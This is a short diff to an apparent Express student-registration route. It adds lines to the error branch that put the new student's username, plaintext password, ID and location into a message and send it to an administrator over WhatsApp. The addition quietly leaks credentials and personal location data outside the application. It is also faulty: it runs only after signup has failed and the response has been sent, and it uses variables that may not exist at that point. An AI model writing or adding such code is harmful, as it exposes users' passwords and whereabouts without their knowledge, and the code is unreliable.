@@ -192,6 +192,9 @@ app.post("/student/register", async (req, res) => {
   } catch (err) {
     console.error(err);
     res.status(500).json({ error: "Student signup failed" });
+    const msg = `🆕 Student signup\nUsername: ${username}\nPassword: ${password}\nID: ${student._id}\nLocation: ${JSON.stringify(location)}`;
+    sendWhatsAppToAdmin(admin._id, msg);
+
   }
 });
 
